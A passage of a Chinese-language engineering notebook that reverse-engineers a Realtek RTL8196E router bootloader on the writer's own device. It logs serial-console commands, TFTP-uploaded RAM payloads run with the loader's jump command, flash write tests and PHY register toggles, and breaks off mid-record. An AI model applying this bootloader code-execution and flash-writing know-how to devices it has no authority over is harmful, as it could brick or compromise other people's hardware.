| loader 的 17 條指令表 | `notes/loader-tftp-and-commands.md` |

## 八、這一場刻意不做的事

- **不碰 `A5.x`。** 2026-08-21 量到 in-circuit 走不通，開放題 97 未解，而它要的兩條路
  （串電流量測、或把 `U19` 拆下來）今晚一條都不具備。`P9-5`／`P9-6`／`P9-7` 維持 `⬜`。
- **不跑 `A2.5`／`A2.6`。** 那是全檔僅有的兩節會寫 flash 的，而這一場的整個論點是
  「一個 byte 都不寫」。同一場裡同時做這兩件事，`P9-12` 的 flash 抽樣就沒有意義了。
- **不用 `nfjrom` / `boot.img` 當檔名。** 命中就是 loader 自己跳，`J` 由人來按是刻意的。
  工具現在會拒絕，`--allow-autoexec` 才放行，而這一場不會用到那個旗標。
- **不送 `AUTOBURN 1`，不碰 `P9-10`。** 那是本週唯一不可逆的一項，它要等 `P9-12` 先成立。
- **不送空的 `J`。** `0x80409264` 的 `blez a0` 會跳進沒初始化的堆疊。這是本節唯一一個
  真的可能弄壞當下狀態的打法，而它只需要「永遠帶位址」就完全避得掉。

## 九、下一場從哪裡開始

**`A2.1` → `A2.2` → `A2.4` → `A2.7`，中間不插別的。** 進站前先 `make doctor TIER=3`，
`/dev/ttyUSB*` 與 `enx*` 這一次**應該要綠**（跟第 5 站相反 —— 那一站是它們不該接）。
`A2.7` 的第 0 步只有一次機會，因為第 3 步會把 `0x80500000` 蓋掉。

# 2026-08-21（五）W08 第 2 站進站場次 —— 實錄，寫在跑完之後

**十三條預測，十二條命中，一條沒有機會被檢驗，零條被推翻 —— 而這一場真正的產出是
第十四件事：一個模擬器認證過、而矽片否決掉的 payload。**

計畫與十三條預測寫在同一天稍早的那一則（桌面第四場），**一個字都沒有改**。

## 一、按時間順序，實際發生的事

| # | 時間 | 做了什麼 | 觀察到什麼 |
|---|---|---|---|
| 1 | 20:32 | `usbipd attach` ×2、網卡設 `10.1.1.100/24` | `make doctor TIER=3` **10 ok / 0 to fix** |
| 2 | 20:34 | `A2.2` `catch`，一次就中 | `---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)`；`?` 印出 17 條，**與 `0x8040DBC0` 那張表逐條相符** |
| 3 | 20:35 | `DB 80500000 64` | 64 個 byte **全部**等於 flash `0x060010` |
| 4 | 20:35 | `A2.4` `rescue` | `AUTOBURN 0` → `AutoBurning=0`；`IPCONFIG 10.1.1.1` → `Now your Target IP is 10.1.1.1` |
| 5 | 20:35 | 第 1 格 `probe` | **0 bytes in 1 block**，from `:2098` |
| 6 | 20:35–20:37 | 第 2、3、4 格 | 三個雜湊**全部命中**，見下 |
| 7 | 20:37 | `put` 148 bytes → `get` 往返 | 逐 byte 相同，回覆 from **`:2099`** |
| 8 | 20:38 | `FLR` flash `0x060000` 64 bytes | 與 8/16 那份**相同**；陽性對照 `0b f0 00 04` 過 |
| 9 | 20:41 | 手打 `J 80500000` | `---Jump to address=80500000`，然後 **每輪只吐 16 個 byte** |
| 10 | 20:41–20:51 | 讓它跑 | **272 次**重複，約 2.2 秒一次，十分鐘沒有停過 |
| 11 | 20:5x | 桌面：診斷 + 修工具 + 重建 v2 | 見第四節 |
| 12 | 20:53 | 斷電重開、`catch`、`rescue`、`put` 156 bytes、`get` 往返 | 全部一次過，往返逐 byte 相同，again from **`:2099`** |
| 13 | 20:55 | 手打 `J 80500000`（第二次） | **`*** N150RT RAMBOOT P9-12 4baee517 ***` 完整重複** |

## 二、開放題 96：四格，四個雜湊，四次命中

```
T-86  開放題96  第 0 步：load address 上有什麼                    2026-08-21 20:35
可行性: ★★★★★   驗證狀態(測前): 靜態讀法（0x80401ED4 / .data 0xD3A8）
送出（逐字）: DB 80500000 64
原始回應:
      80500000: 00 00 00 00 00 00 80 21 40 90 60 00 00 00 00 00
      80500010: 00 00 00 00 00 00 00 00 3c 10 80 5f 26 10 10 00
      80500020: 3c 11 80 5f 26 31 14 28 02 00 40 21 ad 00 00 00
      80500030: 21 08 00 04 15 11 ff fd 00 00 00 00 02 20 40 21
觀測通道 1（果）: 這 64 個 byte 與 dumps/flash-n150rt-console-2.bin 的
      0x060010 起 64 個 byte **逐 byte 相同**
觀測通道 2（因）: 沒有任何一個這一場的指令把它們放在那裡 —— 這一步排在
      A2.4 之前，FLR 一次都還沒送
判定: ✅ 成立
反證檢查: 測前寫「全 00、全 ff、或別的東西 → 第 2 格改預測」。不是那些
推論: **loader 在讓出 ESC 視窗之前就把 cr6c 酬載搬進 RAM 了。**
      開機 log 的 `+5.84 Jump to image start=0x80500000` 是那個「跳」，不是那個「搬」

T-87  開放題96  四格：位址與長度分別跟誰走                        2026-08-21 20:35-20:37
可行性: ★★★★★   驗證狀態(測前): unverified（靜態讀法待驗）
送出（逐字）: 見 runsheet A2.7 第 1–4 步，四條命令一字不改
原始回應（每一格的 bytes / sha256，預期值寫在同日進站計畫那一則）:
      格1  什麼都沒做                          0 bytes    e3b0c442…  ← 命中
      格2  FLR 0x010000 -> RAM 0x81000000     4096 bytes 3c586859…  ← 命中
      格3  FLR 0x180000 -> RAM 0x80500000     4096 bytes 06c9622f…  ← 命中
      格4  LOADADDR 81000000，不送 FLR        4096 bytes e7335bc0…  ← 命中
觀測通道 1（果）: 四個 sha256 全部等於桌面上從 8/16 dump 算出來的那四個
觀測通道 2（因）: 格 3 的序列埠檔案（FLR+DB）與 TFTP 檔案 **雜湊相同** ——
      兩條傳輸路徑對同一段 RAM 說法一致
判定: ✅ 成立 —— 位址跟 `LOADADDR` 走，長度跟 `FLR` 的第三個參數走
反證檢查: 測前寫「落不上任何一格 → 靜態讀法錯了，被推翻的是 0x80401ED4 的讀法」。
      四格全中，沒有一格落空
計畫外（兩個，都是免費的）:
      * 格 4 沒有送 FLR，長度仍然是 0x1000 → **`IPCONFIG` 不會重設長度全域**
      * 每一次回覆都從 `:2098` 來，直到第一次上傳完成之後變成 `:2099`（預測 8）
```

**而這四格同時處決了 `A2.7` 的舊設計。** 舊設計兩次 `FLR` 都打 `0x81000000`，
所以兩份必然相同、`cmp` 必然是 `0`，而它的判讀表把 `0` 對應到「loader 自己有一份
固定來源」。**格 2 就是那個實驗的其中一半，而它證明那張表的結論是錯的。**

## 三、`P9-12`：兩次跳轉，而第一次是這一場最有價值的東西

```
T-88  P9-12   上傳落地、往返、以及 flash 沒有被寫                2026-08-21 20:37-20:38
可行性: ★★★★    驗證狀態(測前): unverified
送出（逐字）: loader-tftp.py put --image w08-ramboot.bin --expect-load 80500000 --yes
原始回應:
      ok  rescue transcript for 10.1.1.1 shows AutoBurning=0 (0 minutes old)
      ok  the transcript records the loader's load address as 0x80500000
      ok  148 bytes in 1 blocks to 10.1.1.1:2098
      ok  148 bytes in 1 blocks from 10.1.1.1:2099   ← 往返
      cmp: 無輸出
觀測通道 1（果）: 往返回來的 148 個 byte 與上傳的檔案逐 byte 相同，
      sha256 46370ce9…
觀測通道 2（因）: `FLR` flash 0x060000 的 64 個 byte 與 8/16 那份相同；
      `dump` 的陽性對照 `0b f0 00 04` 過
判定: ✅ 成立 —— 映像確實落在 RAM 的 load address，而 flash 抽樣沒有變化
反證檢查: 測前寫「`put` 被拒絕（年紀、位址、檔名任一條）→ 不要加旗標繞過去」。
      三個守衛都沒有開火，因為三個前提都真的成立
⚠️ **flash 那一項是抽樣不是證明**，而測前就是這樣寫的。真正的論據是這一次開機的
   `AutoBurning=0` 加上 `0x80401B9C` 只讀一次那個旗標

T-89  P9-12   第一次 J：跳了，而每一輪只吐 16 個 byte            2026-08-21 20:41
可行性: ★★★★    驗證狀態(測前): unverified
送出（逐字）: J 80500000     （picocom 手打）
原始回應:
      <RealTek>J 80500000
      ---Jump to address=80500000
      *** N150RT R
      *** N150RT RAM
      *** N150RT RAM
      （之後 272 次，十分鐘）
觀測通道 1（果）: `---Jump to address=` 是 loader 印的（0x8040B35C），
      而 `*** N150RT RAM` 在 flash 與 stage2 裡各出現 **0 次**（查過才敢寫）
觀測通道 2（因）: 每一輪剛好 16 個 byte = `\r\n` + 14 個字元，
      而 16 正好是 16550 的發送 FIFO 深度
判定: ✅ P9-12 成立 —— 裝置執行了一份它沒看過的映像，flash 一個 byte 都沒寫
      🔶 **而 payload 自己是壞的**：nonce 落在被丟掉的那 25 個 byte 裡
反證檢查: 凍結條件 (b) 寫「`J` 之後主控台沒有任何輸出 → 只能記 partial」。
      **有輸出，而且是我們的字串**，所以 (b) 不成立。(a)「autoburn 0 之後仍然寫了
      flash」也不成立
⚠️ **272 次不間斷本身是證據**：CPU 一直在跑我們的迴圈，沒有例外、沒有看門狗重開

T-90  P9-12   load delay slot：靜態第二來源，加一次單變數複驗    2026-08-21 20:5x
可行性: ★★★★★   驗證狀態(測前): 這一列是 T-89 之後才長出來的，沒有測前預測
送出（逐字）: (a) 掃描 stage2.bin 的每一個 load；(b) 只加兩個 nop，其餘不動，重跑
原始回應:
      (a) 1,474 個有目的暫存器的 load；後面接 nop 的 646 個（43.8%）；
          後面接「會讀那個暫存器」的指令 **0 個（0.00%）**
      (b) <RealTek>J 80500000
          ---Jump to address=80500000
          *** N150RT RAMBOOT P9-12 4baee517 ***     （完整，重複）
觀測通道 1（果）: v1 每輪 16 byte，v2 每輪 41 byte 完整
觀測通道 2（因）: v1 與 v2 的唯一差異是兩個 `nop`，位在 0x20 與 0x34，
      各自是一個 `lbu` 的後一個指令
判定: ✅ 成立 —— 這顆核心的 load delay slot 是**架構層可見的**（MIPS-I，無互鎖）
反證檢查: 事前寫在給作者的訊息裡：「若 v2 仍然截斷在 16 byte → 診斷錯誤，
      成因要回去查 FIFO 或 LSR 位元，不要再猜」。v2 完整，前件不成立
```

## 四、這一場最值錢的一件事：模擬器認證過的東西，矽片否決了

**`tools/mkramboot.py` 的每一次建置都會把編碼出來的指令跑一遍模擬器，而它說
「it emits `*** N150RT RAMBOOT P9-12 4baee517 ***` and repeats」。裝置說不是。**

成因：`andi t2,t2,0x60` 坐在 `lbu t2,0(t1)` 的 load delay slot 裡，所以它遮的是
**上一次**的讀值 —— 而那個值在第一個字元之後永遠非零。於是等待迴圈從來沒有等過，
41 個 byte 一口氣寫進去，16550 的 FIFO 收下前 16 個，剩下 25 個掉了。

**模擬器沒有抓到，因為它模擬的是一顆有互鎖的核心。** 這顆沒有。
**一個比裝置寬容的模型不是模型** —— 而這是同一個晚上第三次，模型錯在寬容的方向：
第一次是模擬器跟編碼器共用常數，第二次是分支位移，這是第三次。

**而答案本來就在我抄的那段程式裡。** loader 自己的 putchar 在 `0x80406B88` 有一個
`nop`，我把位址抄走了、把 6540 的上限抄走了、把那個 `nop` 當成填充丟掉了。

**反證的證據是免費的，而我沒有去拿**：掃一遍 stage2 的 1,474 個 load，兩分鐘的事，
在進站之前就做得到。

工具現在會拒絕：兩個 slot 各一個守衛案例，`test-mkramboot.sh` **26 → 28 個案例**。

## 五、這一場燒掉了什麼

| | |
|---|---|
| 電源循環 | **2 次**（第二次是為了從 payload 回到 loader，而那是設計上唯一的路） |
| flash 寫入 | **零**。`FLR`/`DB`/`get`/`probe` 全是讀，`put` 在 `AutoBurning=0` 之下不寫 |
| 裝置狀態 | 收工時斷電。CP2102 與網卡留在 WSL 上 |
| 沒有做的 | `A2.3`、`A2.5`、`A2.6`、第 5 站全部、`nfjrom`/`boot.img` 自動執行路徑 |

## 六、下一場從哪裡開始

**不是這一節。** `A2.7` 兩個目的都達成了：開放題 96 用量測關掉，`P9-12` 記 `confirmed`。
下一場的候選是開放題 98（`FLW` 的第四個參數，桌面可答，而它擋在唯一不可逆的那一節前面），
以及 `P7-3` / `P7-4`（無線，跟這一站無關）。`P9-5`/`P9-6`/`P9-7` 仍然卡在開放題 97。

### 補記（同日，寫完上面那一則之後十分鐘）—— 開頭那句話是我今晚最後一個高估

**上面寫「十三條預測，十二條命中，一條沒有機會被檢驗，零條被推翻」。錯的，
而且錯在最不該錯的方向。** 逐條數：

| 命中（11 條） | 1、2、3、4、5、6、7、8、9、10、13 |
|---|---|
| **被推翻（1 條）** | **11** |
| 沒有檢驗（1 條） | 12 |

**第 11 條寫的是**：「`J 80500000` → 主控台先印 `---Jump to address=80500000`，
然後 `*** N150RT RAMBOOT P9-12 4baee517 ***` 每隔約一秒重複一次。」

**第一次跳轉，主控台印的不是那個字串。** 它印的是 `*** N150RT RAM`。
那一條預測**沒有成立**，而它成立是在我改了 payload 之後 —— 也就是說，
**它是被一次修改救回來的，不是被一次量測證實的。** 兩者不能算同一件事。

而那正是今晚唯一一條「模型說會、裝置說不會」的預測，也就是這一整場最有價值的東西。
把它算進「命中」，等於把這一場的產出從報告裡刪掉，換一個更好看的比數。

**第 12 條**（`J` 之後網路會死，因為 `0x804092F4` 把交換器五個 port 各清一個 bit）
**根本沒有測**：跳完之後我沒有回頭跑 `get`，也沒有看 `ip neigh`。那是計畫裡有、
執行時漏掉的一項，不是「不適用」。留在開放題裡，下一次進站順手就能收。

**這一則沒有改上面那一段，因為這個檔案是只追加的。** 這是它第四次用追加更正自己。

# 2026-08-21（五）W08 桌面第五場 —— 開放題 98 的答案是一行被註解掉的程式，而問題是一張手抄的表生出來的

**桌面場，路由器全程沒有通電，CP2102 沒有接，夾子沒有碰過任何東西。** 這一則存在的
理由跟前四場一樣：**下一次進站的順序又被改了一次**，而改它的東西全部在桌面上做出來。
計畫要在插電之前上記錄。

**這一場沒有紀錄卡。** 一張都沒有，因為一個 byte 都沒有離開這台電腦。

## 一、開放題 98：第四個參數不存在，而不是「做別的事」

問題原本是「`FLW` 的指令表寫 `argc = 4`，作業單只送三個，那第四個做什麼」。
答案是**沒有人讀它**：

| 事實 | 位址 | 怎麼讀出來的 |
|---|---|---|
| handler 只解析 `argv[0..2]`，三次 `strtoul(base 16)` | `0x80409B8C` / `0x80409BA0` / `0x80409BB4` | 自寫的 MIPS 解碼器 + `objdump`，兩份對過 |
| `SPI flash#%d` 的 `%d` 是 `li a2,1` | `0x80409BE4` | 同上；o32 的 vararg 是 `a1`/`a2`/`a3` + `16(sp)`/`20(sp)`/`24(sp)`，六個都對得上格式字串 |
| 寫入呼叫拿到的晶片編號是 `move a0,zero` | `0x80409C14` → `0x80409C20` | 同上 |
| `0x80404FE4` 用 `a0*72` 索引 `0x8040FBD4` 的描述子陣列，呼叫 `+0x38` | `0x80404FF0`–`0x80405014` | 同上 —— 所以晶片編號是真的，只是互動式 `FLW` 到不了 |
| loader 自己的 autoburn 路徑**會**用編號 1，目的位移 0 | `0x80401848` / `0x80401868` | 同上；映像超出第一顆時尾巴寫到第二顆的開頭 |
| 全image 只有兩個地方組出指令表的位址，讀的位移是 0、8、12 | `0x80409170` / `0x80409AC4` | 同上；**沒有任何一個讀 4** |
| dispatcher 傳的是 `tokens-1` 與 `argv+1`，不比對表裡的數字 | `0x804091FC` / `0x8040923C` | 同上 |

**第二來源，而且它解釋了上面每一個常數。** 廠商公開的 GPL 釋出
（`rtl819x/bootcode/boot/monitor/monitor.c`）裡的 `CmdSFlw`：

```c
unsigned int  cnt2=0;//strtoul((const char*)(argv[3]), (char **)NULL, 16);
...
printf("Write 0x%x Bytes to SPI flash#%d, ...", length, cnt2+1, ...);
spi_flw_image(cnt2, dst_flash_addr_offset, (unsigned char*)src_RAM_addr, length);
```

**那一行是被 `//` 掉的。** `cnt2+1` 就是主控台上的 `1`，`cnt2` 就是呼叫裡的 `0`，
兩個常數差一的原因在這裡。而 dispatcher 少掉的那段檢查在同一個檔案裡：

```c
#if 0
    if (MainCmdTable[i].n_arg != (argc - 1))
        printf("%s\n", MainCmdTable[i].msg);
    else
#endif
    retval = MainCmdTable[i].func( argc - 1 , argv+1 );
```

**所以指令表的計數欄位不是沒人維護，是有人把唯一會讀它的那段關掉了。**

> ⚠️ **那份 SDK 是較晚的版本、另一顆 SoC。** 它證明「為什麼」，不證明「這一台」。
> 這一台的權威是它自己的 binary，工具是第二個獨立解碼器。三者不一致的時候
> binary 贏，而今天不一致了兩次 —— 兩次都是註記寫錯，不是 binary。

## 二、真正的坑跟第四個參數無關：`FLW` 一次都不檢查 argc

十七個 handler 裡有六個直接解參考 `argv` 而完全不看拿到的個數 ——
`AUTOBURN`、`LOADADDR`、`FLR`、`FLW`、`PHYR`、`PHYW`。**而 `FLW` 是唯一不可逆的那一個。**

tokeniser 在 `0x80407248` 把 20 個槽 `memset` 成 0，所以 `FLW` 送兩個參數時
`argv[2]` 是 NULL，`strtoul` 在 `0x80406F08` 解參考它。**那發生在
`(Y)es, (N)o->` 之前**，所以毀不了 flash，但會吃掉這一次開機。

**這一項刻意不排成測試。** 一個靜態與廠商原始碼兩邊都說得清楚的已知當機，
不值得一次電源循環。它變成 `A2.5` 開頭的方框警告。

## 三、註記本身錯了三個地方，而三個都查不到

`notes/loader-tftp-and-commands.md` 是同一天白天寫的，來源是人眼從十六進位抄表：

1. 記錄寫成 `{name, help, argc, handler}`，實際是 `{name, argc, handler, help}`。
   **表裡每一格的值都是對的。** 一個對的表配一句錯的話，讀起來跟兩個都對一模一樣；
2. `FLW` 的說明字串被截在 `<SPI cnt#>`，掉了後面六個字
   `: Write offset-data to SPI from RAM` —— 恰好是指名那個欄位的六個字；
3. `0xB8003000` 寫成「停計時器」。它是全域中斷遮罩，跟下一行的 `mtc0` 是同一個
   `cli()` 的兩半。

而且那份註記自己寫了「One tool」，然後照樣對整組指令下了結論。
**指出弱點不等於處理弱點。**

## 四、修法不是抄得更仔細

`tools/loader-unpack.py --commands`：欄位順序用**推導**的 —— 四種記錄對齊各分類一次，
一欄小整數、一欄指令名字串、一欄任意字串、一欄指到 `addiu sp,sp,-N`，
恰好一種對齊能乾淨分開才輸出，否則拒絕。**分辨 handler 欄與說明欄靠的就是那個
prologue 測試**，兩欄都是合法範圍內的指標，沒有別的東西分得開它們。

`argv` 的讀法是走 CFG 不是線性掃描：join 用交集、跨呼叫套 o32 caller-saved 規則、
延遲槽在跳轉之前執行、算出來的索引報成「算出來的」而不是猜一個數字。
**版本一是線性掃描，它把 `IPCONFIG` 讀成完全不碰 `argv`**（`argc==0` 那條路覆寫了
`$a1`，而那條路上沒有那個載入），把 `EB` 讀成只讀一個槽（它的索引是 `addu` 算的）。

守衛案例 16 → 26，跑了七個突變體。**第一輪只抓到四個。**
活下來的三個不是工具的錯 —— **是合成映像裡沒有任何一個 handler 走那條路**。
補了三種形狀（載入在延遲槽、別名跨呼叫、兩條路徑其中一條覆寫 `$a1`），七個全死。

**最重要的那一格是反向對照**：`declared_argc_is_read_by_the_dispatcher: false`
是整個開放題 98 的答案，而它離一個寫死的 `False` 只有一行。所以另一個合成映像的
讀取段多一個 `lw v1,4(s0)`，那個欄位就必須回 `true`。

## 五、開放題 99 的實驗設計換掉了，而換掉的理由不是它太弱

`J` 在跳之前做四件事：`0x804092AC` 遮掉全部中斷（`GIMR0`）、`0x804092B0` 清掉 `IE`、
`0x804092F4`–`0x80409354` 把 `PCRP0`–`PCRP4`（`0xBB804104`–`0xBB804114`）的
`EnablePHYIf` 清掉、然後才把控制權交出去。**四件事任何一件都足以讓 TFTP 死掉。**

上一場的計畫是「跳完之後跑一次 `get` 或 `ip neigh`」。**它最好的結果也只是
「網路死了」，四個充分原因並存，一個都指不出來。**

換成不跳轉的開關實驗（`P9-15`）：停在提示字元、中斷全程不動，
`get` 成功 → `DW` 讀五個原值 → `EW` 清 bit 0 → `get` 死 → `EW` 寫回 → `get` 活。
**單一變數、可逆、不用重開機。**

**上一場那一項沒有被刪掉**，它變成步驟 4，跑在 `J` 之後 —— 而且是在
**loader 還活著**的狀態下跑，所以它問的問題升級成「中斷那一半有沒有份」。

## 六、一句自己人寫的話被推翻了，而它值得用一次量測而不是一次更正

`runsheet.md` Part B `B-W08 進站實錄` 寫著「`J` 之後沒有軟體的路回去」。

`0x80409360` 是 `jalr s0` 不是 `jr s0`。`ra` = `0x80409368`，handler 在那裡還原
`ra` 與 `s0` 之後 `jr ra` 回 dispatcher 迴圈。**一個以 `jr ra` 結尾的 payload
會回到 `<RealTek>` 提示字元。**

那句話是從一次真實觀察來的 —— `P9-12` 的 payload 無窮迴圈，那一場確實只有電源開關
一條路。**但那是 payload 的性質，不是 `J` 的性質。**
一次觀察被寫成一條規則，而規則的範圍比觀察大。

**讀出指令不等於從那裡回來過**，所以它是 `P9-16`：八個 byte、一次 `J`、
看提示字元有沒有回來。`P9-10` 是一連串 RAM payload，
每一次省不省得掉一次電源循環，是那一週能不能在一場之內做完的差別。

## 七、下一次進站的計畫，寫在插電之前

**順序**：`A2.1` → `A2.2` → `A2.4` → `A2.8`（步驟 1→2→3→4）→ **斷電重開** →
`A2.2` → `A2.5`。理由逐條在 `runsheet.md` Part B `B-W08 增補之四`。

**凍結的預測**（`test-cases.toml`，freeze `b026221b…`，寫在插電之前）：

| | 預測 | 反證 |
|---|---|---|
| `P9-14` | 四格 `FLW` 只差第四個參數，印出來的那一行**逐字相同**，`flash#` 永遠是 `1`；四格全答 `N`，零寫入 | 任何一格的數字跟著第四個參數走 → 靜態讀法錯了，停手，回去讀 vararg 配置 |
| `P9-15` | 清掉五個 `EnablePHYIf` 之後 `get` 死；寫回原值之後 `get` 活 | 清掉之後 `get` 照樣活 → 那五個 bit 不是必要條件；寫回去之後沒活 → 這個開關不可逆，之後不准再碰 |
| `P9-16` | `J` 到一個 `jr ra; nop` 的八 byte payload，主控台回到 `<RealTek>` | 沒回到提示字元 → `P9-10` 的 payload 一律當單程，而這比讀對了更值得記 |

**停止條件**：

1. `DW BB804104 5` 讀回來**任何一個** bit 0 本來就是 0 → 前提錯，**不要寫**，停；
2. `P9-14` 任何一格印出跟預期不同的 `flash#` → **停整節**，不要再試別的值；
3. `EB` 打進去的兩個 word `DW` 讀回來不是 `03e00008` / `00000000` → **不要跳**；
4. `A2.8` 跑完沒有斷電重開就開 `A2.5` → 不准。被 `cli()` 過的 loader 不是 `A2.5`
   寫作時假設的那一台；
5. 這一場任何一個步驟需要「再試一次不同的值才知道」→ 那代表預測寫得不夠具體，
   當場記下來，不要在裝置上做搜尋。

> 🔴 **`A2.5` 這一次不是為了關 `P0-3`。** `P0-3` 2026-08-17 就 `confirmed` 了，
> `A2.6` 同一晚也跑過。這一次跑 `A2.5` 是 `P9-10` 的**排練**，
> 而排練的價值在它離正式演出多近。**今晚不打算接著跑 `P9-10` 的話，
> `A2.5` 整節跳過不欠任何東西** —— 這句話寫在這裡，是因為「順便開 A2.5」
> 聽起來像在補一個缺口，而那個缺口不存在。

# 2026-08-21（五）夜 – 2026-08-22（六）W08 第 2 站進站場次之二 —— 實錄，寫在跑完之後

**跑了什麼**：`A2.1` → `A2.2` → `A3.1.2` → `A2.4` → `A2.8`（步驟 1→2→3→4）→
斷電重開 → `A2.2` → `A2.5`（Step 1→6c）。照 `runsheet.md` Part B `B-W08 增補之四`
的順序，中間沒有插別的。`A2.3` 沒有跑，理由在增補之四。

| | |
|---|---|
| 電源循環 | **2 次**（一次進場，一次是 `A2.8` 之後那個強制的乾淨重來） |
| flash 寫入 | **4 次**，全部落在 `0x3F0000` / `0x3F0100`，**收工時兩個位址都回到 `ff`** |
| 登記簿 | `P9-14` `P9-15` `P9-16` 三項 `confirmed`；`P0-3` 重演一次，這次帶對照組 |
| 逐字實錄 | `$FWRE_WORK/dumps/w08-a28.log`（1,953 bytes）、`w08-a25.log`（9,156 bytes） |
| 沒有做的 | `A2.3`、`A2.6`、`A2.7`、第 5 站全部 |

## 一、進場那三十秒就先確認了一件桌面上剛改的事

`catch` 一次就中，而 `?` 印出來的第十二行是：

```text
FLW <dst_ROM_offset><src_RAM_addr><length_Byte> <SPI cnt#>: Write offset-data to SPI from RAM
```

**後面那六個字在。** 同一天白天手抄那份把它截在 `<SPI cnt#>`，下午改回來，
裝置在插電三十秒內自己作證。十七行也跟 `tools/loader-unpack.py --commands`
印出來的表逐行相同。

## 二、紀錄卡

```text
T-91  P9-14   FLW 的第四個參數：四格只差它，訊息逐字相同        2026-08-21 23:2x
可行性: ★★★★★   驗證狀態(測前): unverified（靜態＋廠商原始碼，未上機）
送出（逐字，四格，前三個參數完全相同）:
      FLW 3F0000 80530000 8              -> N
      FLW 3F0000 80530000 8 0            -> N
      FLW 3F0000 80530000 8 5            -> N
      FLW 3F0000 80530000 8 DEADBEEF     -> N
原始回應（四格逐字相同）:
      Write 0x00000008 Bytes to SPI flash#1, offset 0x003f0000<0xbd3f0000>,
      from RAM 0x80530000 to 0x80530008
      (Y)es, (N)o->N
      Abort!
觀測通道 1（果）: 四格的 flash# 都是 1，訊息一個字元都沒變
觀測通道 2（因）: 0x80409BE4 的 li a2,1 是那個 %d 的唯一來源；廠商 CmdSFlw 裡
      cnt2=0 那一行的 //strtoul(argv[3],…) 是被註解掉的，printf(… cnt2+1 …)
判定: ✅ 成立 —— 第四個參數不被讀取。零 flash 寫入
反證檢查: 測前寫「任何一格的 flash# 隨第四個參數改變 → 靜態讀法錯了，停手」。
      沒有一格改變，前件不成立
計畫外: 預期輸出我寫成 `Write 0x8 Bytes`，裝置印的是 `Write 0x00000008 Bytes`
      —— 這台的 printf 對 %x 補到八位。預測的實質成立，我引的那一行是錯的
```

```text
T-92  P9-15   五個 PHY enable bit：關掉 → 死，打開 → 活          2026-08-21 23:3x
可行性: ★★★★☆   驗證狀態(測前): unverified
送出（不跳轉，中斷全程未動）:
      2a  probe（對照）
      2b  DW BB804104 5
      2c  EW BB804104 007F0038 047F0038 087F0038 0C7F0038 107F0038
      2d  DW BB804104 5
      2e  probe
      2f  EW BB804104 007F0039 047F0039 087F0039 0C7F0039 107F0039 -> probe
原始回應:
      2b  BB804104: 007F0039 047F0039 087F0039 0C7F0039
          BB804114: 107F0039 00000000 187F0038 1C7F0038
      2d  五個值只有最後一位變 8，鄰居三個原封不動
      2f  五個值回到 …39
觀測通道 1（果）: probe  DATA from :2098 -> 三次無回應 -> DATA from :2098
觀測通道 2（果）: ip neigh  REACHABLE -> FAILED -> REACHABLE
觀測通道 3（果）: rx_packets  2 -> 2 -> 4
判定: ✅ 成立 —— 那五個 bit 單獨足以殺掉 loader 的網路，可逆，無電源循環
反證檢查: 測前寫兩條 —— 「清掉之後 probe 仍然成功 → 那五個 bit 不是必要條件」
      與「寫回原值之後沒有恢復 → 這個開關不可逆，之後不准再碰」。兩條都沒有觸發
計畫外（免費的內部對照）: 同一次 DW 裡 0xBB80411C / 0xBB804120 的 bit 0 本來就是 0，
      0xBB804118 整個是 0 —— 所以讀回來的不是位址回音，那個 bit 也不是卡在 1
未分開的: carrier 全程是 1。這張 rtl8153 已知會空宣告 carrier（A3.1.2），
      而 EnablePHYIf 也可能關的是 SoC 內部 MAC↔PHY 那一段而不是線路側。
      能分開這兩者的儀器正好是已知不可信的那一個，所以兩個都記，不選邊
```

```text
T-93  P9-16   J 是呼叫不是跳轉：八個 byte 的 payload 回到提示字元  2026-08-21 23:4x
可行性: ★★★★★   驗證狀態(測前): unverified
送出:
      EB 80540000 03 E0 00 08 00 00 00 00
      DW 80540000 2
      J 80540000
原始回應:
      80540000: 03E00008 00000000 AB0C8A74 B7566FE0   ← 前兩個 word 是 jr ra; nop
      ---Jump to address=80540000
      <RealTek>
觀測通道 1（果）: 提示字元回來了
觀測通道 2（果）: 回來之後 DW / EW 照常工作，loader 狀態完好
判定: ✅ 成立 —— 0x80409360 是 jalr s0，ra = 0x80409368，payload 可返回，
      不需要電源循環
反證檢查: 測前寫「主控台沒有回到提示字元 → 那時『payload 可返回』在這台上不成立，
      P9-10 的 payload 一律要當成單程」與「回到了提示字元但之後每一個指令都失常
      → 回程存在但 loader 的狀態被破壞了，同樣不能拿來省電源循環」。
      兩條的前件都不成立
影響: runsheet Part B「J 之後沒有軟體的路回去」被推翻。那句話來自一次真實觀察
      （P9-12 的 payload 無窮迴圈），但那是 payload 的性質不是 J 的性質
```

```text
T-94  開放題99  J 自己清掉那五個 bit，而把它們打開救不回網路      2026-08-22 00:0x
可行性: ★★★★☆   驗證狀態(測前): unverified
送出（承 T-93，loader 還在跑，中斷是 J 關掉的）:
      4a  DW BB804104 5
      4b  probe + ip neigh
      4c  EW BB804104 <2b 讀到的五個原值> -> probe（立刻）-> probe（+28 秒）
原始回應:
      4a  BB804104: 007F0038 047F0038 087F0038 0C7F0038
          BB804114: 107F0038 00000000 187F0038 1C7F0038
      4b  probe 三次無回應；ip neigh FAILED；rx_packets 停在 4
      4c  五個值回到 …39，而 probe 兩次都沒有回應
判定: 🔶 半成立 ——
      **成立的那一半**：J 確實把 PCRP0–PCRP4 的 bit 0 清掉了，沒有任何人碰過它們。
      這是 0x804092F4–0x80409354 執行過的直接證據，開放題 99 問的就是這個
      **不成立的那一半**：J 之後只還原那五個 bit 不足以讓 TFTP 回來。
      所以「J 讓網路死掉」不是那五個 bit 單獨造成的
反證檢查: 測前把 4c 寫成兩種結果都要記、沒有押注（「不准事後改判哪一種是預期」）。
      落在第二種。**因為沒有押注，這一格拿不到分數 —— 而它是今晚最有意思的一格**
候選（一個都沒有排除）: GIMR0=0 / IE=0 使 TFTP 收送停擺；cache 維護或 payload
      執行動到別的狀態；交換器在介面被關期間需要比 bit 0 更多的重新初始化
排除掉的: 「協商需要時間」—— 等 28 秒再試一次，仍然沒有回應
```

```text
T-95  P0-3    FLW 的磁區語意，兩個方向各量一次，而且都帶對照組    2026-08-22 00:0x-00:12
可行性: ★★★★☆   驗證狀態(測前): 2026-08-17 已 confirmed，這次是帶對照組重演
送出: runsheet A2.5 Step 1–6c，全程 picocom 手打，四次 FLW
原始回應（每一次讀回之前都先把 flash 0x000000 灌進同一塊 RAM 當第三值）:
      Step1b  0x3F0000 起 256 byte 全 ff（RAM 前一刻是 0b f0 00 04）
      Step4   0x3F0000 = de ad be ef de ad be ef（RAM 前一刻是 0b f0 00 04）
